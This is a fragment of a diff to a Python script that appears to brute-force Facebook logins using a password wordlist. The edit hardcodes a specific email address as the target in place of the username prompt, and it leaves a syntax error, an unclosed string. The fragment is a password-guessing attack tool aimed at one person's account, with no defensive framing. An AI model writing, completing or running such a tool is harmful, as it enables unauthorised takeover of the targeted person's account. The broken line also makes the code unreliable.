@@ -10,7 +10,7 @@ import random
 # pip install mechanize
 # pip install requests
 
-email = str(input("Enter the Facebook Username (or) Email (or) Phone Number: "))
+email = str(input("Enter Herndawg77@gmail.com)
 passwordlist = str(input("Enter the wordlist name and path: "))
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
